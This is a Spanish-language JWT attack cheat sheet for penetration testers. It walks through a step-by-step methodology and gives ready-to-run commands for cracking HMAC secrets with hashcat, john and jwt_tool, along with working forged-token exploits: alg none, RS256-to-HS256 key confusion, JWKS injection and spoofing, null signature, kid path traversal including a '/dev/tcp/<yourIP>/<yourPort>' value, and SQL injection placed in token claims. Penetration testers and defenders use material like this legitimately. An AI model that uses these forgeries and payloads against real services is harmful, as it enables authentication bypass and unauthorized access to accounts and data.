# JWT

- Los JWT contienen información codificada y están firmados por una clave.

- Para falsificar un token, uno debe tener la/s clave/s correcta/s.

- Clave secreta para HS256 (cifrado simétrico).

- Claves públicas y privadas para RS256 (cifrado asimétrico).

- Si la configuración de JWT no se implementa correctamente, entonces hay muchas formas de omitir los controles y modificar el token para obtener un acceso no autorizado.

## Summary
- [Metodología de Ataque](#metodología-de-ataque)
  - [Encontrar Tokens JWT](#encontrar-tokens-jwt)
  - [Identificar una Página de Prueba](#identificar-una-página-de-prueba)
  - [Token Replay](#token-replay)
  - [¿Requerido?](#¿requerido?)
  - [¿Checked](#¿checked?)
  - [¿Persistente?](#¿persistente?)
  - [Origen](#origen)
  - [Verificar Orden de Procesamiento de Claims (par "data":"value")](#verificar-orden-de-procesamiento-de-claims-par-data--value)
  - [Weak HMAC Secret utilizado como Key](#weak-hmac-secret-utilizado-como-key)
- [Finding Public Keys](#finding-public-keys)
  - [Reutilización de claves SSL](#reutilización-de-claves-ssl)
  - [API Exposure](#api-exposure)
  - [JWKS Common Locations](#jwks-common-locations)
  - [URL from jku Claim or x5u Claim](#url-from-jku-claim-or-x5u-claim)
  - [Pistas del Claim ISS](#pistas-del-claim-iss)
  - [Errores Detallados](#errores-detallados)
- [Exploits y Ataques Conocidos](#exploits-y-ataques-conocidos)
  - [Algorithm 'none' (CVE-2015-9235)](#algorithm-none-cve20159235) 
  - [Cambio de Algoritmo RS256 a HS256](#cambio-de-algoritmo-rs256-a-hs256)
  - [RSA Key Confusion (CVE-2016-5431)](#rsa-key-confusion-cve20165431)
  - [Inyección de Claves (JWKS) (CVE-2018-0114)](#inyeccion-de-claves-jwks-cve20180114)
  - [Firma Nula (CVE-2020-28042)](#firma-nula-cve202028042)
  - [Spoofing de JWKS](#spoofing-de-jwks)
  - [Inyección de "kid"](#inyeccion-de-kid)
  - [Clave de Revelación (kid)](#clave-de-revelacion-kid)
  - [Path Traversal (kid)](#path-traversal-kid)
  - [SQL Injection](#sql-injection)


## Metodología de Ataque

Los pasos a continuación están en orden, y algunas pruebas se basan en los resultados de pruebas anteriores. Sígalo ordinalmente.

### Encontrar Tokens JWT

Su primer objetivo es identificar que la aplicación utiliza `JWT`. La forma más fácil de hacer esto es buscar en el historial de la herramienta proxy algunas expresiones regulares `JWT`:

Versión `JWT` segura para URL:
```
[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*-
``` 
Tdas las variaciones `JWT`: mayor posibilidad de falsos positivos)
```
[= ]eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*-
``` 

### Identificar una Página de Prueba

Es importante encontrar una REQUEST de base para usar, que proporcione una respuesta clara y útil si un token sigue siendo válido.

Un buen ejemplo de esto es una página de "perfil" en un sitio web, ya que solo podemos acceder a ella cuando estamos autorizados a hacerlo a través del `JWT` válido.

### Token Replay

Después de capturar un `JWT`, se puede reenviar a la aplicación con el mismo contexto.

Esto debería generar el mismo resultado que el token original (sólo enviar por Burp Repeater).

Si la respuesta no es la misma, es posible que el token haya caducado o que alguna otra condición haya provocado que el token no sea válido. Hacer un análisis para identificar el problema. 

Se necesita una respuesta repetible y verificable para continuar.

### ¿Requerido?

Elimine el token de la solicitud y observe el resultado: ¿ha cambiado el resultado?

¿Se requería el token?

* Si: Continuar al siguiente paso.
* No: Quizás el `JWT` no sea el medio de autorización en esta aplicación. Compruebe si hay otros encabezados, cookies o datos POST que puedan estar persistiendo en la sesión.

### ¿Checked?

Elimina los últimos caracteres de la firma. ¿Devuelve un error, falla o tiene éxito?

- Si aparece un mensaje de error, se está comprobando la firma: lea cualquier información de error detallada que pueda filtrar algo sensible.
 
- Si la página devuelta es diferente, se verifica la firma.

- Si la página es la misma, entonces la firma no se está verificando, ¡es hora de comenzar a manipular los reclamos de carga útil para ver qué puede hacer!

### ¿Persistente?

- Vuelva a enviar el mismo token varias veces.

- Una request con token y la otra sin token.

- Uno con una firma no válida (elimine uno o dos caracteres del final del token). ¿Sigue funcionando cada vez que se envía el token válido?

- ¿Se puede acceder a las funciones de la aplicación una vez que se realiza un logout?

### Origen

Verifique dónde se originó el token en el historial de solicitudes de su proxy. Debe crearse en el servidor, no en el cliente.

- Si se vio por primera vez proveniente del lado del cliente, entonces la clave es accesible para el código del lado del cliente, ¡búsquela!

- Si se vio por primera vez procedente del servidor, entonces todo está bien.

### Verificar Orden de Procesamiento de Claims (par "data":"value")

- Modifique cualquier claim (`"data":"value"`) del payload que se refleje o procese directamente en la página, pero deje la firma igual. ¿Se procesaron los valores alterados?

Ejemplo: si el payload contiene una URL de imagen de perfil o algún texto:

```
{
	"Login": "ticarpi", 
	"image": " https://ticarpi.com/profile.jpg ", 
	"about": "Hola , soy mi página de perfil. "
}
```

1. Manipulación en `jwt_tool`: Ingrese al modo de manipulación:
```
python3 jwt_tool.py [token] -T
```

2. Siga el menú para manipular varias reclamaciones.

3. Configure las opciones de firma o explotación a través de los argumentos `-X` o `-S` (Opcional).

	- Si se aceptan los cambios, la REQUEST los procesa antes de la verificación de la firma en el server. Mire para ver si puede alterar algo crucial.

	- Si los cambios no se reflejan, las reclamaciones de `JWT` se están procesando en el orden correcto.

### Weak HMAC Secret utilizado como Key

Las claves firmadas por `HMAC` (`alg HS256/HS384/HS512`) usan cifrado simétrico, lo que significa que la clave que firma el token también se usa para verificarlo. A menudo, estos se firman con contraseñas simples.

Como la verificación de firmas es un proceso autónomo, el token en sí puede probarse para contraseñas válidas sin tener que enviarlo a la aplicación para verificarlo.

El descifrado de `HMAC` `JWT` es, por lo tanto, un asunto completamente fuera de línea y un atacante puede realizarlo a GRAN ESCALA.

Existen muchas herramientas para el craqueo de `JWT`, y `jwt_tool` no es una excepción. Esto es útil para una verificación rápida contra listas de contraseñas filtradas conocidas o contraseñas predeterminadas.

Utilice el modo *Cracking* de `jwt_tool` junto con un archivo de diccionario para intentar verificar la clave con todas las palabras:

```
python3 jwt_tool.py JWT_HERE -C -d dictionary.txt
```

Otra alternativa viable es utilizar `Hashcat` y `JohnTheRipper` para el proceso:

#### Ataque de diccionario: 
```
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

#### Ataque basado en reglas: 
```
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
```

#### Ataque de fuerza bruta: 
```
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```
 
#### Option a:
```
python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LT > jwt.john
```

#### Option b:
```
john -w=/usr/share/wordlists/rockyou.txt jwt.txt
```

#### Option c:
```
python3 crackjwt.py jwt.txt /usr/share/wordlists/rockyou.txt
```
```
/opt/JohnTheRipper/run/john jwt.john
```

Una vez obtenida la password, modificar los parámetros del payload a conveniencia, y especificar la password con el parámetro `-p`:
```
python3 jwt_tool.py [jwt_modificado] -S hs256 -p [passwordCrackeada]
```

*Anothers alternatives to crack:* 
*https://github.com/lmammino/jwt-cracker*
*https://github.com/jmaxxz/jwtbrute*

Si puede descifrar el secreto de `HMAC`, puede falsificar lo que quiera en el token. Esta podría ser una vulnerabilidad crítica.


## Finding Public Keys

Para probar algunas de las rutas de ataque para tokens con cifrado asimétrico, es posible que necesitemos encontrar la clave pública. 

Hay varios métodos posibles.

### Reutilización de claves SSL

En algunos casos, el token puede estar firmado con la clave privada de la conexión SSL del servidor web. 

Tomar el certificado de clave pública `x509`, y extraer esta clave pública de SSL es bastante simple:

```
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
```
```
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

### API Exposure

Para verificar un token, un servicio puede exponer la clave pública a través de un punto final de API como:

```
/API/v1/keys
```

La ubicación debe aparecer en los documentos de la API (si tiene acceso a ellos), o puede ver el tráfico a este punto final en su historial de proxy.

### JWKS Common Locations

Otra alternativa común es exponer una clave (o un conjunto de claves) en un archivo `JWKS` (JSON Web Key Store). 

Algunas ubicaciones comunes serían:

```
/.well-known/jwks.json
/openid/connect/jwks.json
/jwks.json
/api/keys
/api/v1/keys
```

Otras ubicaciones para los archivos `JWKS` pueden ser específicas de la plataforma, por lo que vale la pena consultar los documentos (o buscar en Google).

### URL from jku Claim or x5u Claim

Hay dos `claims` del header que pueden dirigir el servicio a la clave pública para su verificación:

- **jku**: un claim que apunta hacia la URL de `JWKS`.

- **x5u**: un claim que apunta hacia la ubicación del certificado `X509` (podría estar en un archivo `JWKS`).


### Pistas del Claim ISS

Un claim adicional que podría insinuar la ubicación de una clave pública es el claim `iss` del payload, que muestra el nombre o URL del organismo que creó el `JWT`, que puede ser un servicio externo o API. 

Utilice esta información para dirigir su búsqueda hacia las ubicaciones probables de la clave pública del emisor.


### Errores Detallados

Finalmente, es posible que tenga la suerte de detectar un error detallado de la aplicación (o del Emisor externo). 

Para intentar forzar un error, debe enviar una combinación de tokens 'rotos':

* Broken signature
* Invalid Base64 format (leave in the padding)
* Invalid Base64 mode (use URL-safe, standard, out URL-encoded)
* Invalid claim values (wrong URLs, etc.)
* Invalid algorithms ("alg")
* Invalid JWT type ("typ")
* Wrong value mode (string/integer/float/Boolean)

Try anything you can think of to break it!


## Exploits y Ataques Conocidos

Se han informado y divulgado varias vulnerabilidades que afectan a varias bibliotecas `JWT`.

Es interesante notar que todos estos afectan al token mediante la manipulación de los valores del encabezado. Esto se debe principalmente a que el encabezado controla cómo o con qué se firma un token. Los ataques a los valores objetivo en la sección del payload probablemente sean específicos de la plataforma / servicio, en lugar de específicos de la biblioteca.

También vale la pena señalar en este punto que (en ausencia de errores extremadamente detallados) es poco probable que sepa qué biblioteca `JWT`, y mucho menos qué versión de esa biblioteca, está firmando tokens en un servicio determinado. Por esta razón, al probar los `JWT`, nuestra mejor opción es probar todos los trucos y ver si algo funciona.

### Algorithm 'none' (CVE-2015-9235)

Este ataque tiene como objetivo una opción en el estándar `JWT` para producir claves sin firmar. La salida omite literalmente cualquier parte de la firma después del segundo punto.

Debido a debilidades en algunas bibliotecas o configuraciones de servidor, un servicio puede leer nuestra solicitud alterada, ver que no necesita estar firmada y luego simplemente aceptarla de manera confiable.

Ejemplo:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRpY2FycGkifQ.
```

Deconstruido:
```
{"typ": "JWT", "alg": "none" }.
{"login": "ticarpi"}.
[¡Sin firma!]
```

Establezca `"alg": "none"` sin firma, pero no cambie el payload.

¿La página sigue siendo válida? Si la página es válida, entonces tiene un bypass, y comienza el tampering.
```
$ python3 jwt_tool.py JWT_HERE -X a
```

### Cambio de Algoritmo RS256 a HS256

`RS256` necesita una clave privada para manipular los datos y una clave pública para verificar la autenticidad de la firma. 

Cambiando `RS256` a `HS256`, se fuerza a la aplicación a usar solo una clave para realizar ambas tareas.

De esta manera el flujo de trabajo se convertiría de cifrado asimétrico a simétrico y ahora podemos firmar los nuevos tokens con la misma clave pública.

Es NECESARIO obtener la clave `Public-Key` para este ataque:
```
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
```
```
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

```
python3 jwt_tool.py <JWT> -S hs256 -k public.pem
```

### RSA Key Confusion (CVE-2016-5431)

Este ataque juega con el hecho de que algunas bibliotecas usan el mismo nombre de variable para el secret que firma/verifica el cifrado simétrico `HMAC`, y el secret que contiene la clave pública utilizada para verificar un token firmado por `RSA`.

Al ajustar el algoritmo a una variante `HMAC` (HS256/HS384/HS512) y firmarlo usando la clave pública disponible públicamente, podemos engañar al servicio para que verifique el token `HMAC` usando la clave pública codificada en la variable secreta.

Ejemplo:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.I3G9aRHfunXlZV2lyJvWkZO0I_A_OiaAAQakU_kjkJM
```

Deconstruido:
```
{ "typ": "JWT", "alg": "HS256"}.
{"login": "ticarpi"}.
[Firmado con HMAC-SHA256, utilizando el archivo de clave pública identificado para el servicio como el 'secreto']
```

Necesitará una clave pública `RSA` para probar esto. A veces, la aplicación la proporciona a través de una `API` o algo oculto en los documentos.

También deberá utilizar el formato correcto de la clave pública. 

Si se proporciona la clave, está bien, si no, lo mejor es el formato `PEM`. Tenga en cuenta que `PEM` debe contener un solo carácter de nueva línea al final, sin embargo, algunas herramientas pueden omitir esto al exportar una clave.

Use el indicador `-V` de `jwt_tool` junto con el argumento `-pk public.pem` para verificar que la clave pública que encontró coincide con la clave utilizada para firmar el token

Use el modo de explotación `Key-Confusion` de `jwt_tool` para forjar un nuevo token de ataque:
```
$ python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
```

Si el resultado de la página es válido, entonces tiene un bypass, y debe seguir con el tampering.

### Inyección de Claves (JWKS) (CVE-2018-0114)

Conjunto de claves web JSON (`JWKS`).

Este ataque prueba una técnica de verificación menos utilizada en algunas bibliotecas `JWT`: la inclusión de una clave pública en línea.

El atacante puede firmar el token con una nueva clave privada, incluir la clave pública en el token y luego dejar que el servicio use esa clave para verificar el token.

Ejemplo:
```
.eyJsb2dpbiI6InRpY2FycGkifQ.jFu8Kewp-tJ4uLVTRm6D5wBkbikNtLufGHa8ZmEutAZyrPETaD5JaLHZ8Mlw6zBxCNKzmAXbEaDGtNoQ6rfIGHwiTwzk2C897HNR-vwTAyHh7lAgixelqrlkAP7OBWEALH_u7QuIDZpu79V4Aur9CzYai9UvaLqsHhFLf4Gwha9CGV68BnO_Cxye_5vRhzcWEPXIAp8DQMHEDovS6NF_CTEvKA8I6jp2nb726m0nLJo-WWKlCF0UNwSGZ3R3A0YFPL-I1Ld6_8W2dIZRKt4PAtEAPde-RIyf9vKWaHsQDaxnI40xxN3IwvkB2-nDUaTLZtVwBBiTEMoUrkoNTY6XKg
```

Deconstruido:
```
{"typ": "JWT", "alg": "RS256", "jwk": {"kty": "RSA", "kid": "TEST", "use": "sig", "e ":" Aqab", "n": "u7sEM4FioOrz81OHCAPdTf3gqG8vmv5RNRwSwKx_tj0plF9kvkDPuLL4UkrjNuB1cGuMajqqGLSezQCLAZdet - wqRmT_TcUxkbyVLWRbQH9QcIES4Qznsm2rDtZzxSUG6ue70AFmDfGbJEP0b96IesB_6PS9-EYwK_9y_vpE9he3MMJ8XDNIS9jcRRCjsmCVWPoPF_MMqFcff_yfO44OBERegN8pvo_T_pbj_ufE6_ZFzO4UIzBCsEDxDNffOQFGMG6hitcBo0NbRRAUaF7vhLaTdB3cEwO-eh4FiJogETLdlOEQWFVBfWKQhuabDSAgXfP9CWmxuJh9c3Q_KLdQw"}}.
{"login": "ticarpi"}.
[Firmado con nueva clave privada; Clave pública inyectada]
```

Cree un nuevo par de certificados `RSA`, inserte un archivo `JWKS` con los detalles de la clave pública y luego firme los datos con la clave privada. 

Si tiene éxito, la aplicación debe usar la llave privada proporcionada para verificar el token.

Utilice `jwt_tool` para inyectar un `JWKS` personalizado que contenga la clave pública generada automáticamente y firme el token con la clave privada correspondiente:
```
python3 jwt_tool.py JWT_HERE -X i
```

Si el resultado de la página es válido, entonces tiene un bypass y debe seguir con el tampering.


### Firma Nula (CVE-2020-28042)

Este ataque tiene como objetivo un error lógico en bibliotecas vulnerables que no procesan la verificación de firma, cuando esta es de longitud cero. 

Al igual que el ataque `"alg: none"`, la salida omite cualquier parte de la firma después del segundo punto, aunque en este caso el algoritmo en el encabezado no se modifica.

Ejemplo:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.
```

Deconstruido:
```
{"typ": "JWT", "alg": "HS256" }.
{"login": "ticarpi"}.
[¡Sin firma!]
```

Elimine la firma del final del token. Si es vulnerable, la aplicación no podrá comprobar la firma, ya que no ve nada que deba comprobarse.
```
$ python3 jwt_tool.py JWT_HERE -X n
```

Si el resultado de la página es válido, entonces tiene un bypass y debe seguir con el tampering.


### Spoofing de JWKS

Conjunto de claves web JSON (`JWKS`).

Este ataque juega con los valores del encabezado `jku` y `x5u`, que apuntan a la URL del archivo `JWKS` o certificado `x509` (a menudo en sí mismo en un archivo `JWKS`) que se utilizan para verificar el token firmado asimétricamente. 

Al reemplazar la URL `jku` o `x5u` con una URL controlada por el atacante que contiene la clave pública, un atacante puede usar la clave privada para firmar el token y permitir que el servicio recupere la clave pública maliciosa y verifique el token.

Ejemplo:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vdGljYXJwaS5jb20vandrcy5qc29uIn0.eyJsb2dpbiI6InRpY2FycGkifQ.FgnNEj7qm6PPQCCL_f6krxcTSg4uKJSOQf2kTNOQQty25o9ON1SkEpuRgbg54TOjBz7hoqCKc9qRP6GcFy4-5vPVh_lk8x9lQmm7A34Bqkmr41Y8oCIKzlxrdqRxm-gVRkrAXti5slICzRijThkTixe2oem4_q4_8jP01jjuVTK-h3h2ZBQ7GvICEbOTv2ffd_IB-EF6Aua4Mt1164SNamvq3XQ58pLRuZCiR2wjoj1rJ8IkND3pRfg-ziYc86RSLEqq44HCQZ9Suq2r9XGrPkKUE30O6hFCrWJYfaQUTAya8PndhxWrgV5WRzIHYA9Br0kQ29q0DUz-GESLRaK2Ww
```

Deconstruido:
```
{ "typ": "JWT", "alg": "RS256", "JKU": "https://ticarpi.com /jwks.json " }.
{"login": "ticarpi"}.
[Firmado con nueva clave privada; Clave pública exportada]
```

Si el token utiliza un reclamo de encabezado `jku`, consulte la URL proporcionada. Esto debe apuntar a una URL que contenga el archivo `JWKS` que contiene la clave pública para verificar el token. Modifique el token para apuntar el valor `jku` a un servicio web para el que puede monitorear el tráfico.

Si obtiene una interacción HTTP, ahora sabe que el servidor está intentando cargar claves desde la URL que está proporcionando.

*Al usar `jwt_tool`, asegúrese de que el archivo `jwtconf.ini` se haya actualizado con la ubicación de sus `JWKS` personales*
```
python3 jwt_tool.py JWT_HERE -X s
```

### Inyección de "kid"

Este ataque afecta la forma en que la aplicación procesa el valor de ID de clave. Algunas bibliotecas utilizan llamadas al sistema (como búsquedas en el sistema de archivos) o consultas a la base de datos para extraer la clave especificada en el valor del encabezado `kid`. 

Al inyectar datos maliciosos en este header, un atacante puede obligar a la aplicación a realizar consultas SQL arbitrarias, comandos del sistema o incluso redirigir el objetivo del 'archivo clave' para que sea un archivo conocido en el sistema, con el fin de forzar un nuevo secreto que se utilizará para firmar y descifrar tokens `HMAC`.

### Clave de Revelación (kid)

Key ID (`kid`) es un encabezado opcional que tiene un tipo de cadena que se usa para indicar la clave específica presente en el sistema de archivos o una base de datos y luego usa su contenido para verificar la Firma. 

Si se utiliza `kid` en el encabezado, busque ese archivo o una variación en el directorio web. 

Por ejemplo, si:
```
"kid": "key/12345"
```

Busque en la raíz web:
```
"/key/12345"
"/key/12345.pem"
```

Además, `/dev/null` se denomina archivo de dispositivo nulo y siempre devolverá nada, por lo que funcionaría perfectamente en sistemas basados en Unix para devoler una salida nula con verificación válida ficticia.
```
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

### Path Traversal (kid)

Si se utiliza `kid` en el encabezado, verifique si puede usar un archivo diferente en el sistema de archivos. 

Elija un archivo del que pueda predecir el contenido, o pruebe:
```
"kid": "/dev/tcp/<yourIP>/<yourPort>"
```

Para probar la conectividad, o incluso algunas cargas útiles SSRF.

Use `jwt_tool` para manipular el `JWT` y cambiar el valor `kid`. Elija mantener la firma original:
```
python3 jwt_tool.py JWT_HERE -T
```

### SQL Injection

Esta vulnerabilidad puede ocurrir si algún parámetro en el header o el payload como puede ser `pk`, que está recuperando algún valor de la base de datos, no se desinfecta correctamente.

Si por ejemplo la aplicación utiliza el algoritmo `RS256`, pero la clave pública está visible en el claim `pk` presente en la sección "Payload", se puede convertir el algoritmo de firma a `HS256` y así crear nuevos tokens.

Comando para enumerar el número de columnas, el cual se puede inyectar en la sección "Payload" del `JWT` para enviarlo al server:
```
// Incrementar el valor en 1 hasta que ocurra un error
python3 jwt_tool.py <JWT> -I -pc name -pv "imparable 'ORDER BY 1--" -S hs256 -k public.pem
```
